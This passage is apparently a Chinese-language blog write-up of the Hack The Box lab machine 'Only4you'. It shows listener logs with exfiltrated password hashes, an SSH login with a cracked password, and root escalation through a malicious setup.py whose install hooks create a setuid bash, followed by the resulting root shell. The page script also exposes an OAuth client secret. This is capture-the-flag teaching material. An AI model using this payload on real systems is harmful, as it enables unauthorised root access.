<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.11.210 - - [24/Jul/2023 05:35:01] <span class="hljs-string">&quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:01] <span class="hljs-string">&quot;GET /?username=admin HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:01] <span class="hljs-string">&quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:01] <span class="hljs-string">&quot;GET /?username=john HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:01] <span class="hljs-string">&quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:01] <span class="hljs-string">&quot;GET /?username=admin HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:02] <span class="hljs-string">&quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:02] <span class="hljs-string">&quot;GET /?username=john HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:02] <span class="hljs-string">&quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:02] <span class="hljs-string">&quot;GET /?username=admin HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:02] <span class="hljs-string">&quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:02] <span class="hljs-string">&quot;GET /?username=john HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:03] <span class="hljs-string">&quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:03] <span class="hljs-string">&quot;GET /?username=admin HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:03] <span class="hljs-string">&quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:03] <span class="hljs-string">&quot;GET /?username=john HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:03] <span class="hljs-string">&quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:03] <span class="hljs-string">&quot;GET /?username=admin HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:04] <span class="hljs-string">&quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:35:04] <span class="hljs-string">&quot;GET /?username=john HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>

<p>我们拿到了admin和john的密码哈希，admin的不用看了，就是admin的，看看john的是啥，丢到hashes破解一下。</p>
<p class='item-img' data-src='/pic/assets/fa84e0f219af1de9a478b64800ede2de.png'><img src="/pic/assets/fa84e0f219af1de9a478b64800ede2de.png" alt="fa84e0f219af1de9a478b64800ede2de"></p>
<h3 id="提权到user"><a href="#提权到user" class="headerlink" title="提权到user"></a>提权到user</h3><p>拿到密码，直接尝试ssh登录john，发现成功登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh john@10.10.11.210<br>john@10.10.11.210<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Mon 24 Jul 2023 12:18:20 PM UTC</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.06              Processes:             239</span><br><span class="hljs-string">  Usage of /:   84.7% of 6.23GB   Users logged in:       0</span><br><span class="hljs-string">  Memory usage: 48%               IPv4 address for eth0: 10.10.11.210</span><br><span class="hljs-string">  Swap usage:   0%</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Introducing Expanded Security Maintenance for Applications.</span><br><span class="hljs-string">   Receive updates to over 25,000 software packages with your</span><br><span class="hljs-string">   Ubuntu Pro subscription. Free for personal use.</span><br><span class="hljs-string"></span><br><span class="hljs-string">     https://ubuntu.com/pro</span><br><span class="hljs-string"></span><br><span class="hljs-string">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enable ESM Apps to receive additional future security updates.</span><br><span class="hljs-string">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">john@only4you:~$</span><br></code></pre></td></tr></table></figure>

<p>john的home目录就能拿到user flag。</p>
<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@only4you:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> john on only4you:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User john may run the following commands on only4you:<br>    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz<br></code></pre></td></tr></table></figure>

<p>我们发现john有无密码执行<code>/usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz</code>的权限。我们之前已经发现3000端口是一个gogs服务，我们该怎么利用呢？不管怎么说，先搜一下<code>pip3 download exploit</code>再说。</p>
<p>谷歌一下就能发现，pip3 download存在代码执行的漏洞。<a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/">Pip Download Code Execution</a>。那就来作用了，我们按着这个漏洞的POC操作一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> exp<br><span class="hljs-built_in">cd</span> exp<br>vim setup.py<br><span class="hljs-built_in">mkdir</span> src<br><span class="hljs-built_in">touch</span> src/__init__.py<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;print(&quot;hello&quot;)&#x27;</span> &gt; src/main.py<br></code></pre></td></tr></table></figure>

<p>setup.py的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># setup.py</span><br><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages<br><span class="hljs-keyword">from</span> setuptools.command.install <span class="hljs-keyword">import</span> install<br><span class="hljs-keyword">from</span> setuptools.command.egg_info <span class="hljs-keyword">import</span> egg_info<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RunCommand</span>():<br>	<span class="hljs-comment"># Arbitrary code here!</span><br>	<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RunEggInfoCommand</span>(<span class="hljs-title class_ inherited__">egg_info</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        RunCommand()<br>        egg_info.run(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RunInstallCommand</span>(<span class="hljs-title class_ inherited__">install</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        RunCommand()<br>        install.run(self)<br><br>setup(<br>    name = <span class="hljs-string">&quot;exp&quot;</span>,<br>    version = <span class="hljs-string">&quot;0.0.1&quot;</span>,<br>    license = <span class="hljs-string">&quot;MIT&quot;</span>,<br>    packages=find_packages(),<br>    cmdclass=&#123;<br>        <span class="hljs-string">&#x27;install&#x27;</span> : RunInstallCommand,<br>        <span class="hljs-string">&#x27;egg_info&#x27;</span>: RunEggInfoCommand<br>    &#125;,<br>)<br></code></pre></td></tr></table></figure>

<p>然后<code>python3 -m build</code>一下，会在dist目录下生成exp-0.0.1.tar.gz。</p>
<p>然后我们传到gogs上，再执行一下sudo就搞定了。</p>
<p>Gogs的登录密码就用john的登录凭证，密码复用真是方便。直接进行一个文件的传。直接传到现有的Test的仓库就行，新建一个也行，但是反正速度要快，速度慢了仓库会被自动清掉。</p>
<p class='item-img' data-src='/pic/assets/0ef25abd4e0ea108b75ef97c0535242a.png'><img src="/pic/assets/0ef25abd4e0ea108b75ef97c0535242a.png" alt="0ef25abd4e0ea108b75ef97c0535242a"></p>
<p>然后还没收工，如果随便选一个地方pip download你会发现会报错，要先把仓库clone现在，在里面操作才行。</p>
<p>错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@only4you:/tmp$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br>Collecting http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br>  ERROR: HTTP error 404 <span class="hljs-keyword">while</span> getting http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br>  ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz because of error 404 Client Error: Not Found <span class="hljs-keyword">for</span> url: http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br>ERROR: Could not install requirement http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz because of HTTP error 404 Client Error: Not Found <span class="hljs-keyword">for</span> url: http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz <span class="hljs-keyword">for</span> URL http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br></code></pre></td></tr></table></figure>

<p>正确：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@only4you:/tmp$ git <span class="hljs-built_in">clone</span> http://127.0.0.1:3000/john/Test.git<br>Cloning into <span class="hljs-string">&#x27;Test&#x27;</span>...<br>Username <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;http://127.0.0.1:3000&#x27;</span>: john<br>Password <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;http://john@127.0.0.1:3000&#x27;</span>:<br>remote: Enumerating objects: 6, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (6/6), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (4/4), <span class="hljs-keyword">done</span>.<br>remote: Total 6 (delta 0), reused 0 (delta 0)<br>Unpacking objects: 100% (6/6), 1.47 KiB | 300.00 KiB/s, <span class="hljs-keyword">done</span>.<br>john@only4you:/tmp$ <span class="hljs-built_in">cd</span> Test/<br>john@only4you:/tmp/Test$ <span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxrwxr-x  3 john john 4096 Jul 24 13:37 .<br>drwxrwxrwt 35 root root 4096 Jul 24 13:37 ..<br>-rw-rw-r--  1 john john 1016 Jul 24 13:37 exp-0.0.1.tar.gz<br>drwxrwxr-x  8 john john 4096 Jul 24 13:37 .git<br>-rw-rw-r--  1 john john   12 Jul 24 13:37 README.md<br>john@only4you:/tmp/Test$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br>Collecting http://127.0.0.1:3000/john/Test/raw/master/exp-0.0.1.tar.gz<br>  File was already downloaded /tmp/Test/exp-0.0.1.tar.gz<br>Successfully downloaded exp<br></code></pre></td></tr></table></figure>

<p>我们回到tmp里面就会看到我们的rootbash了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@only4you:/tmp$ <span class="hljs-built_in">ls</span> -la<br>total 13488<br>drwxrwxrwt 35 root     root        4096 Jul 24 13:38 .<br>drwxr-xr-x 17 root     root        4096 Mar 30 11:51 ..<br>......<br>-rwsr-sr-x  1 root     root     1183448 Jul 24 13:38 rootbash<br>......<br>john@only4you:/tmp$ ./rootbash -p<br>rootbash-5.0<span class="hljs-comment"># id</span><br>uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(john)<br>rootbash-5.0<span class="hljs-comment"># whoami</span><br>root<br>rootbash-5.0<span class="hljs-comment"># cd /root</span><br>rootbash-5.0<span class="hljs-comment"># ls -al</span><br>total 48<br>drwx------  5 root root   4096 Mar 30 12:10 .<br>drwxr-xr-x 17 root root   4096 Mar 30 11:51 ..<br>lrwxrwxrwx  1 root root      9 Nov 30  2022 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root   3106 Dec  5  2019 .bashrc<br>drwxr-xr-x  3 root neo4j  4096 Mar 14 11:19 .cache<br>-rw-------  1 root root     35 Mar 30 12:10 .lesshst<br>lrwxrwxrwx  1 root root      9 Dec  8  2022 .mysql_history -&gt; /dev/null<br>-rw-r--r--  1 root root    161 Dec  5  2019 .profile<br>-rw-r-----  1 root root     33 Jul 24 07:58 root.txt<br>drwxr-xr-x  2 root root   4096 Mar 30 11:51 scripts<br>drwx------  2 root root   4096 Mar 29 09:56 .ssh<br>-rw-------  1 root root  12283 Mar 30 10:59 .viminfo<br>rootbash-5.0<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p>成功拿下。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台机子综合考察了代码审计能力以及对文件包含漏洞需要查看哪些敏感文件的理解，还要求我们掌握内网穿透以及内网服务发现能力。考察的面还是比较广的，有些难度。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/26/Authority/">← Next [HTB]  Authority</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/19/Busqueda/">[HTB]  Busqueda Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">2.2.</span> <span class="toc-text">nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">2.3.</span> <span class="toc-text">whatweb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99"><span class="toc-number">3.1.</span> <span class="toc-text">手动访问网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">LFI利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12-0"><span class="toc-number">3.4.</span> <span class="toc-text">代码审计2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">3.5.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">内网服务发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cypher-Injection"><span class="toc-number">4.2.</span> <span class="toc-text">Cypher Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0user"><span class="toc-number">4.3.</span> <span class="toc-text">提权到user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0root"><span class="toc-number">4.4.</span> <span class="toc-text">提权到root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>